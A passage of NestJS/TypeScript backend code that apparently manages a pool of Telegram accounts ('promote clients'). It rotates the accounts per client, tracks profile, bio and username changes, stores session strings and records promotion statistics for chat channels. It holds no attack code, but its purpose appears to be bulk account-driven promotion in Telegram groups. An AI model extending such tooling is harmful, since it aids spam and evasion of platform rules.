Map(recentlyUsedCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n\n        const distributionPerClient: Array<{\n            clientId: string;\n            assignedCount: number;\n            activeCount: number;\n            inactiveCount: number;\n            needed: number;\n            status: 'sufficient' | 'needs_more';\n            neverUsed: number;\n            usedInLast24Hours: number;\n        }> = [];\n        let clientsWithSufficient = 0;\n        let clientsNeedingMore = 0;\n        let totalNeeded = 0;\n\n        for (const client of clients) {\n            const assignedCount = assignedCountMap.get(client.clientId) || 0;\n            const activeCount = activeCountMap.get(client.clientId) || 0;\n            const inactiveCount = inactiveCountMap.get(client.clientId) || 0;\n            const neverUsed = neverUsedCountMap.get(client.clientId) || 0;\n            const usedInLast24Hours = recentlyUsedCountMap.get(client.clientId) || 0;\n            const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - activeCount);\n            const status = needed === 0 ? 'sufficient' : 'needs_more';\n\n            distributionPerClient.push({\n                clientId: client.clientId,\n                assignedCount,\n                activeCount,\n                inactiveCount,\n                needed,\n                status,\n                neverUsed,\n                usedInLast24Hours,\n            });\n\n            if (status === 'sufficient') {\n                clientsWithSufficient++;\n            } else {\n                clientsNeedingMore++;\n                totalNeeded += needed;\n            }\n        }\n\n        const maxPerTrigger = this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER;\n        const triggersNeeded = Math.ceil(totalNeeded / maxPerTrigger);\n\n        return {\n            totalPromoteClients,\n            unassignedPromoteClients,\n            activePromoteClients,\n            inactivePromoteClients,\n            distributionPerClient,\n            summary: {\n                clientsWithSufficientPromoteClients: clientsWithSufficient,\n                clientsNeedingPromoteClients: clientsNeedingMore,\n                totalPromoteClientsNeeded: totalNeeded,\n                maxPromoteClientsPerTrigger: maxPerTrigger,\n                triggersNeededToSatisfyAll: triggersNeeded,\n            },\n        };\n    }\n\n    async getPromoteClientsByStatus(status: string): Promise<PromoteClient[]> {\n        return this.promoteClientModel.find({ status }).exec();\n    }\n\n    async getPromoteClientsWithMessages(): Promise<\n        Array<{\n            mobile: string;\n            status: string;\n            message: string;\n            clientId?: string;\n            lastUsed?: Date;\n        }>\n    > {\n        return this.promoteClientModel\n            .find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 })\n            .exec();\n    }\n\n    async getLeastRecentlyUsedPromoteClients(clientId: string, limit: number = 1): Promise<PromoteClient[]> {\n        // Note: PromoteClient schema doesn't have 'inUse' field, so we only filter by status\n        return this.promoteClientModel\n            .find({ clientId, status: 'active' })\n            .sort({ lastUsed: 1, _id: 1 })\n            .limit(limit)\n            .exec();\n    }\n\n    async getNextAvailablePromoteClient(clientId: string): Promise<PromoteClient | null> {\n        const clients = await this.getLeastRecentlyUsedPromoteClients(clientId, 1);\n        return clients.length > 0 ? clients[0] : null;\n    }\n\n    async getUnusedPromoteClients(hoursAgo: number = 24, clientId?: string): Promise<PromoteClient[]> {\n        const cutoffDate = new Date(Date.now() - hoursAgo * 60 * 60 * 1000);\n        const filter: Record<string, any> = {\n            status: 'active',\n            $or: [\n                { lastUsed: { $lt: cutoffDate } },\n                { lastUsed: { $exists: false } },\n                { lastUsed: null },\n            ],\n        };\n\n        if (clientId) {\n            filter.clientId = clientId;\n        }\n\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async getUsageStatistics(clientId?: string): Promise<{\n        totalClients: number;\n        neverUsed: number;\n        usedInLast24Hours: number;\n        usedInLastWeek: number;\n        averageUsageGap: number;\n    }> {\n        const filter: Record<string, any> = { status: 'active' };\n        if (clientId) {\n            filter.clientId = clientId;\n        }\n\n        const now = new Date();\n        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);\n        const lastWeek = new Date(now.getTime() - 7 * this.ONE_DAY_MS);\n\n        const [\n            totalClients,\n            neverUsed,\n            usedInLast24Hours,\n            usedInLastWeek,\n            allClients,\n        ] = await Promise.all([\n            this.promoteClientModel.countDocuments(filter),\n            this.promoteClientModel.countDocuments({\n                ...filter,\n                $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],\n            }),\n            this.promoteClientModel.countDocuments({\n                ...filter,\n                lastUsed: { $gte: last24Hours },\n            }),\n            this.promoteClientModel.countDocuments({\n                ...filter,\n                lastUsed: { $gte: lastWeek },\n            }),\n            this.promoteClientModel.find(filter, { lastUsed: 1, createdAt: 1 }).exec(),\n        ]);\n\n        let totalGap = 0;\n        let gapCount = 0;\n\n        for (const client of allClients) {\n            if (client.lastUsed) {\n                const gap = now.getTime() - new Date(client.lastUsed).getTime();\n                totalGap += gap;\n                gapCount++;\n            }\n        }\n\n        const averageUsageGap = gapCount > 0 ? totalGap / gapCount / (60 * 60 * 1000) : 0;\n\n        return {\n            totalClients,\n            neverUsed,\n            usedInLast24Hours,\n            usedInLastWeek,\n            averageUsageGap,\n        };\n    }\n\n    private createTimeout(callback: () => void, delay: number): NodeJS.Timeout {\n        const timeout = setTimeout(() => {\n            this.activeTimeouts.delete(timeout);\n            callback();\n        }, delay);\n        this.activeTimeouts.add(timeout);\n        return timeout;\n    }\n}","// Export all schemas\nexport * from './promote-client.schema';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type PromoteClientDocument = PromoteClient & Document;\n@Schema({\n  collection: 'promoteClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class PromoteClient {\n  @Prop({ required: true })\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @Prop({ required: true })\n  lastActive: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n\n  @Prop({ required: false })\n  clientId?: string;\n\n  @Prop({ required: false, default: 'active' })\n  status: string;\n\n  @Prop({ required: false, default: 'Account is functioning properly' })\n  message: string;\n\n  @Prop({ required: false, type: Date, default: null })\n  lastUsed: Date;\n  \n @Prop({ required: false, type: Date, default: null })\n  privacyUpdatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  profilePicsUpdatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  nameBioUpdatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  profilePicsDeletedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  usernameUpdatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  createdAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  updatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  lastChecked: Date;\n  \n  @Prop({ required: false, type: Date, default: null })\n  lastUpdateAttempt: Date;\n\n  @Prop({ required: false, type: Number, default: 0 })\n  failedUpdateAttempts: number;\n\n  @Prop({ required: false, type: Date, default: null })\n  lastUpdateFailure: Date;\n}\n\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\n\n// Create index for better performance when querying by clientId\nPromoteClientSchema.index({ clientId: 1 });\n","export * from './promote-msgs.controller';\nexport * from './promote-msgs.module';\nexport * from './promote-msgs.service';\nexport * from './promote-msgs.schema';\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { PromoteMsgsService } from './promote-msgs.service';\n\n@ApiTags('Promote-msgs')\n@Controller('promote-msgs')\nexport class PromoteMsgsController {\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get promote-msgs data' })\n  async findOne(): Promise<any>{\n    return this.promoteMsgsService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update promote-msgs' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.promoteMsgsService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteMsgsService } from './promote-msgs.service';\nimport { PromoteMsgsController } from './promote-msgs.controller';\nimport { PromoteMsgSchema } from './promote-msgs.schema';\nimport { InitModule } from '../ConfigurationInit';\n\n@Global()\n@Module({\n  imports: [\n    InitModule,\n    PromoteMsgModule,\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\n  ],\n  providers: [PromoteMsgsService],\n  controllers: [PromoteMsgsController],\n  exports: [PromoteMsgsService],\n})\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type PromoteMsgDocument = PromoteMsg & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class PromoteMsg {}\n\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { PromoteMsg } from './promote-msgs.schema';\n\n@Injectable()\nexport class PromoteMsgsService {\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\n        if (!user) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","// create-promote-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreatePromoteStatDto {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  releaseDay: number;\n\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  isActive: boolean;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  channels: string[];\n}\n","// Export all DTOs\nexport * from './create-promote-stat.dto';\nexport * from './update-promote-stat.dto';\n","// update-promote-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\n\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\n","export * from './promote-stat.controller';\nexport * from './promote-stat.module';\nexport * from './promote-stat.service';\nexport * from './dto';\nexport * from './schemas';\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { PromoteStatService } from './promote-stat.service';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\n\n@ApiTags('promote-stats')\n@Controller('promote-stats')\nexport class PromoteStatController {\n  constructor(private readonly promoteStatService: PromoteStatService) {}\n\n  @Post()\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\n    return this.promoteStatService.create(createPromoteStatDto);\n  }\n\n  @Get(':client')\n  async findByClient(@Param('client') client: string) {\n    return this.promoteStatService.findByClient(client);\n  }\n\n  @Put(':client')\n  async update(\n    @Param('client') client: string,\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\n  ) {\n    return this.promoteStatService.update(client, updatePromoteStatDto);\n  }\n\n  @Delete(':client')\n  async deleteOne(@Param('client') client: string) {\n    return this.promoteStatService.deleteOne(client);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.promoteStatService.deleteAll();\n  }\n}\n","import { InitModule } from './../ConfigurationInit/init.module';\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteStatService } from './promote-stat.service';\nimport { PromoteStatController } from './promote-stat.controller';\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\n    ClientModule\n  ],\n  controllers: [PromoteStatController],\n  providers: [PromoteStatService],\n  exports: [PromoteStatService]\n})\nexport class PromoteStatModule { }\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class PromoteStatService {\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\n    @Inject(forwardRef(() => ClientService))\n    private clientService: ClientService,) { }\n\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\n    return createdPromoteStat.save();\n  }\n\n  async findAll(): Promise<PromoteStat[]> {\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\n    return promoteStat;\n  }\n\n\n  async findByClient(client: string): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async deleteOne(client: string): Promise<void> {\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.promoteStatModel.deleteMany({}).exec();\n  }\n\n  async reinitPromoteStats() {\n    const users = await this.findAll()\n    for (const user of users) {\n      await this.promoteStatModel.updateOne({ client: user.client },\n        {\n          $set: {\n            totalCount: 0,\n            uniqueChannels: 0,\n            releaseDay: Date.now(),\n            lastUpdatedTimeStamp: Date.now(),\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\n          }\n        }\n      );\n    }\n  }\n}\n","// Export all schemas\nexport * from './promote-stat.schema';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type PromoteStatDocument = PromoteStat & Document;\n\n@Schema()\nexport class PromoteStat {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  @Prop({ required: true, unique: true })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  @Prop({ required: true, type: Map, of: Number })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  @Prop({ required: true })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  @Prop({ required: true })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  @Prop({ required: true })\n  releaseDay: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  @Prop({ required: true })\n  isActive: boolean;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\n  @Prop({ required: true })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  @Prop({ required: true, type: [String] })\n  channels: string[];\n}\n\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\n","import { Injectable } from '@nestjs/common';\r\nimport { TelegramClient } from 'telegram';\r\nimport { TelegramLogger } from '../Telegram/utils/telegram-logger';\r\n\r\ninterface ClientInfo {\r\n    client: TelegramClient;\r\n    mobile: string;\r\n    sessionString: string;\r\n    createdAt: Date;\r\n    lastActivity: Date;\r\n    isCreating: boolean;\r\n    lockId?: string;\r\n}\r\n\r\n@Injectable()\r\nexport class ClientRegistry {\r\n    private static instance: ClientRegistry | null = null;\r\n    private readonly clients = new Map<string, ClientInfo>();\r\n    private readonly logger = new TelegramLogger('clientRegistry');\r\n    private readonly locks = new Map<string, { acquired: Date; lockId: string }>();\r\n\r\n    // Maximum time to wait for a lock (in ms)\r\n    private readonly LOCK_TIMEOUT = 30000; // 30 seconds\r\n\r\n    // Maximum time a lock can be held (in ms)\r\n    private readonly LOCK_EXPIRY = 120000; // 2 minutes\r\n\r\n    // Client inactivity timeout (in ms)\r\n    private readonly CLIENT_TIMEOUT = 300000; // 5 minutes\r\n\r\n    private constructor() {\r\n        // Start cleanup interval\r\n        setInterval(() => this.cleanupInactiveClients(), 60000); // Run every minute\r\n        setInterval(() => this.cleanupExpiredLocks(), 30000); // Run every 30 seconds\r\n    }\r\n\r\n    public static getInstance(): ClientRegistry {\r\n        if (!ClientRegistry.instance) {\r\n            ClientRegistry.instance = new ClientRegistry();\r\n        }\r\n        return ClientRegistry.instance;\r\n    }\r\n\r\n    /**\r\n     * Acquire a lock for a phone number to prevent concurrent operations\r\n     */\r\n    async acquireLock(mobile: string): Promise<string | null> {\r\n        const lockId = `${mobile}_${Date.now()}_${Math.random()}`;\r\n        const now = new Date();\r\n\r\n        // Check if lock already exists\r\n        const existingLock = this.locks.get(mobile);\r\n        if (existingLock) {\r\n            // Check if lock is expired\r\n            if (now.getTime() - existingLock.acquired.getTime() > this.LOCK_EXPIRY) {\r\n                this.locks.delete(mobile);\r\n                this.logger.info(mobile, 'Removed expired lock');\r\n            } else {\r\n                this.logger.info(mobile, 'Lock already exists, waiting...');\r\n                return null;\r\n            }\r\n        }\r\n\r\n        // Acquire lock\r\n        this.locks.set(mobile, { acquired: now, lockId });\r\n        this.logger.info(mobile, `Lock acquired: ${lockId}`);\r\n        return lockId;\r\n    }\r\n\r\n    /**\r\n     * Release a lock for a phone number\r\n     */\r\n    releaseLock(mobile: string, lockId: string): boolean {\r\n        const lock = this.locks.get(mobile);\r\n        if (lock && lock.lockId === lockId) {\r\n            this.locks.delete(mobile);\r\n            this.logger.info(mobile, `Lock released: ${lockId}`);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    /**\r\n     * Wait for lock acquisition with timeout\r\n     */\r\n    async waitForLock(mobile: string): Promise<string | null> {\r\n        const startTime = Date.now();\r\n\r\n        while (Date.now() - startTime < this.LOCK_TIMEOUT) {\r\n            const lockId = await this.acquireLock(mobile);\r\n            if (lockId) {\r\n                return lockId;\r\n            }\r\n\r\n            // Wait 1 second before retrying\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n        }\r\n\r\n        throw new Error(`Lock acquisition timeout for ${mobile}`);\r\n    }\r\n\r\n    /**\r\n     * Check if a client exists for the phone number\r\n     */\r\n    hasClient(mobile: string): boolean {\r\n        return this.clients.has(mobile);\r\n    }\r\n\r\n    /**\r\n     * Get client info if it exists\r\n     */\r\n    getClientInfo(mobile: string): ClientInfo | null {\r\n        return this.clients.get(mobile) || null;\r\n    }\r\n\r\n    /**\r\n     * Register a new client (only if none exists or after acquiring lock)\r\n     */\r\n    async registerClient(\r\n        mobile: string,\r\n        client: TelegramClient,\r\n        sessionString: string,\r\n        lockId: string\r\n    ): Promise<boolean> {\r\n        // Verify lock ownership\r\n        const lock = this.locks.get(mobile);\r\n        if (!lock || lock.lockId !== lockId) {\r\n            throw new Error(`Invalid lock for registering client: ${mobile}`);\r\n        }\r\n\r\n        // Check if client already exists\r\n        if (this.clients.has(mobile)) {\r\n            this.logger.error(mobile, 'Client already exists, cannot register new one', new Error('Duplicate client'));\r\n            return false;\r\n        }\r\n\r\n        const clientInfo: ClientInfo = {\r\n            client,\r\n            mobile,\r\n            sessionString,\r\n            createdAt: new Date(),\r\n            lastActivity: new Date(),\r\n            isCreating: false,\r\n            lockId\r\n        };\r\n\r\n        this.clients.set(mobile, clientInfo);\r\n        this.logger.info(mobile, 'Client registered successfully');\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * Mark a client as currently being created\r\n     */\r\n    markClientCreating(mobile: string, lockId: string): boolean {\r\n        const lock = this.locks.get(mobile);\r\n        if (!lock || lock.lockId !== lockId) {\r\n            return false;\r\n        }\r\n\r\n        const existing = this.clients.get(mobile);\r\n        if (existing) {\r\n            existing.isCreating = true;\r\n            existing.lastActivity = new Date();\r\n            return true;\r\n        }\r\n\r\n        // Create placeholder for client being created\r\n        const clientInfo: ClientInfo = {\r\n            client: null as any, // Will be set later\r\n            mobile,\r\n            sessionString: '',\r\n            createdAt: new Date(),\r\n            lastActivity: new Date(),\r\n            isCreating: true,\r\n            lockId\r\n        };\r\n\r\n        this.clients.set(mobile, clientInfo);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * Update activity timestamp\r\n     */\r\n    updateActivity(mobile: string): void {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (clientInfo) {\r\n            clientInfo.lastActivity = new Date();\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Remove a client\r\n     */\r\n    async removeClient(mobile: string, lockId?: string): Promise<boolean> {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (!clientInfo) {\r\n            return false;\r\n        }\r\n\r\n        // If lockId is provided, verify ownership\r\n        if (lockId) {\r\n            const lock = this.locks.get(mobile);\r\n            if (!lock || lock.lockId !== lockId) {\r\n                this.logger.error(mobile, 'Invalid lock for removing client', new Error('Invalid lock'));\r\n                return false;\r\n            }\r\n        }\r\n\r\n        // Disconnect client if it exists\r\n        if (clientInfo.client) {\r\n            try {\r\n                let tempClient = clientInfo.client;\r\n                if (tempClient) {\r\n                    try {\r\n                        await tempClient.destroy();\r\n                        tempClient._eventBuilders = [];\r\n                        this.logger.info(mobile, 'Temporary client cleaned up');\r\n                    } catch (cleanupError) {\r\n                        this.logger.error(mobile, 'Failed to cleanup temporary client', cleanupError);\r\n                    } finally {\r\n                        if (tempClient) {\r\n                            tempClient._destroyed = true;\r\n                            if (tempClient._sender && typeof tempClient._sender.disconnect === 'function') {\r\n                                await tempClient._sender.disconnect();\r\n                            }\r\n                            tempClient = null;\r\n                        }\r\n                    }\r\n                } this.logger.info(mobile, 'Client disconnected during removal');\r\n            } catch (error) {\r\n                this.logger.error(mobile, 'Error disconnecting client during removal', error);\r\n            }\r\n        }\r\n\r\n        this.clients.delete(mobile);\r\n        this.logger.info(mobile, 'Client removed from registry');\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * Get active client count\r\n     */\r\n    getActiveClientCount(): number {\r\n        return this.clients.size;\r\n    }\r\n\r\n    /**\r\n     * Get all phone numbers with active clients\r\n     */\r\n    getActivemobiles(): string[] {\r\n        return Array.from(this.clients.keys());\r\n    }\r\n\r\n    /**\r\n     * Cleanup inactive clients\r\n     */\r\n    private async cleanupInactiveClients(): Promise<void> {\r\n        const now = new Date();\r\n        const inactiveClients: string[] = [];\r\n\r\n        for (const [mobile, clientInfo] of this.clients.entries()) {\r\n            const inactiveTime = now.getTime() - clientInfo.lastActivity.getTime();\r\n\r\n            if (inactiveTime > this.CLIENT_TIMEOUT) {\r\n                inactiveClients.push(mobile);\r\n            }\r\n        }\r\n\r\n        for (const mobile of inactiveClients) {\r\n            this.logger.info(mobile, 'Removing inactive client');\r\n            await this.removeClient(mobile);\r\n        }\r\n\r\n        if (inactiveClients.length > 0) {\r\n            this.logger.info('SYSTEM', `Cleaned up ${inactiveClients.length} inactive clients`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Cleanup expired locks\r\n     */\r\n    private cleanupExpiredLocks(): void {\r\n        const now = new Date();\r\n        const expiredLocks: string[] = [];\r\n\r\n        for (const [mobile, lock] of this.locks.entries()) {\r\n            const lockAge = now.getTime() - lock.acquired.getTime();\r\n\r\n            if (lockAge > this.LOCK_EXPIRY) {\r\n                expiredLocks.push(mobile);\r\n            }\r\n        }\r\n\r\n        for (const mobile of expiredLocks) {\r\n            this.locks.delete(mobile);\r\n            this.logger.info(mobile, 'Removed expired lock');\r\n        }\r\n\r\n        if (expiredLocks.length > 0) {\r\n            this.logger.info('SYSTEM', `Cleaned up ${expiredLocks.length} expired locks`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Force cleanup all clients and locks for a phone number\r\n     */\r\n    async forceCleanup(mobile: string): Promise<number> {\r\n        let cleanedCount = 0;\r\n\r\n        // Remove lock\r\n        if (this.locks.has(mobile)) {\r\n            this.locks.delete(mobile);\r\n            cleanedCount++;\r\n        }\r\n\r\n        // Remove client\r\n        if (await this.removeClient(mobile)) {\r\n            cleanedCount++;\r\n        }\r\n\r\n        this.logger.info(mobile, `Force cleanup completed, removed ${cleanedCount} items`);\r\n        return cleanedCount;\r\n    }\r\n\r\n    /**\r\n     * Get registry statistics\r\n     */\r\n    getStats(): {\r\n        activeClients: number;\r\n        activeLocks: number;\r\n        mobiles: string[];\r\n    } {\r\n        return {\r\n            activeClients: this.clients.size,\r\n            activeLocks: this.locks.size,\r\n            mobiles: Array.from(this.clients.keys())\r\n        };\r\n    }\r\n}\r\n","export * from './session.service';\r\nexport * from './session.controller';\r\nexport * from './session.module';\r\nexport * from './client-registry';\r\nexport * from './session-audit.service';\r\nexport * from './schemas/sessions.schema';\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type SessionAuditDocument = SessionAudit & Document;\r\n\r\nexport enum SessionStatus {\r\n    CREATED = 'created',\r\n    ACTIVE = 'active',\r\n    EXPIRED = 'expired',\r\n    REVOKED = 'revoked',\r\n    FAILED = 'failed'\r\n}\r\n\r\nexport enum SessionCreationMethod {\r\n    OLD_SESSION = 'old_session',\r\n    USER_MOBILE = 'user_mobile',\r\n    INPUT_SESSION = 'input_session'\r\n}\r\n\r\n@Schema({\r\n    collection: 'session_audits',\r\n    versionKey: false,\r\n    autoIndex: true,\r\n    timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n            delete ret.__v;\r\n        },\r\n    },\r\n})\r\nexport class SessionAudit {\r\n    @ApiProperty({ example: '916265240911', description: 'Phone number associated with the session' })\r\n    @Prop({ required: true, index: true })\r\n    mobile: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuM==...', description: 'Encrypted session string' })\r\n    @Prop()\r\n    sessionString?: string;\r\n\r\n    @ApiProperty({ example: 'active', description: 'Current status of the session', enum: SessionStatus })\r\n    @Prop({ required: true, enum: SessionStatus, default: SessionStatus.CREATED })\r\n    status: SessionStatus;\r\n\r\n    @ApiProperty({ example: 'old_session', description: 'Method used to create the session', enum: SessionCreationMethod })\r\n    @Prop({ required: true, enum: SessionCreationMethod })\r\n    creationMethod: SessionCreationMethod;\r\n\r\n    @ApiProperty({ example: 'Session created successfully', description: 'Creation success/failure message' })\r\n    @Prop()\r\n    creationMessage?: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuM==...', description: 'Previous session string used for creation (if applicable)' })\r\n    @Prop()\r\n    previousSessionString?: string;\r\n\r\n    @ApiProperty({ example: '2023-12-01T10:00:00Z', description: 'When the session was created' })\r\n    @Prop({ default: Date.now })\r\n    createdAt: Date;\r\n\r\n    @ApiProperty({ example: '2023-12-01T15:30:00Z', description: 'Last time the session was used' })\r\n    @Prop({ default: Date.now })\r\n    lastUsedAt: Date;\r\n\r\n    @ApiProperty({ example: '2024-01-01T10:00:00Z', description: 'When the session expires' })\r\n    @Prop()\r\n    expiresAt?: Date;\r\n\r\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID associated with this session' })\r\n    @Prop()\r\n    clientId?: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username associated with this session' })\r\n    @Prop()\r\n    username?: string;\r\n\r\n    @ApiProperty({ example: 3, description: 'Number of retry attempts during creation' })\r\n    @Prop({ default: 0 })\r\n    retryAttempts: number;\r\n\r\n    @ApiProperty({ example: 'Rate limit exceeded', description: 'Error message if creation failed' })\r\n    @Prop()\r\n    errorMessage?: string;\r\n\r\n    @ApiProperty({ \r\n        example: { userAgent: 'Telegram-Desktop/1.0', ipAddress: '192.168.1.1' }, \r\n        description: 'Additional metadata about session creation' \r\n    })\r\n    @Prop({ type: Object })\r\n    metadata?: Record<string, any>;\r\n\r\n    @ApiProperty({ example: false, description: 'Whether this session is currently 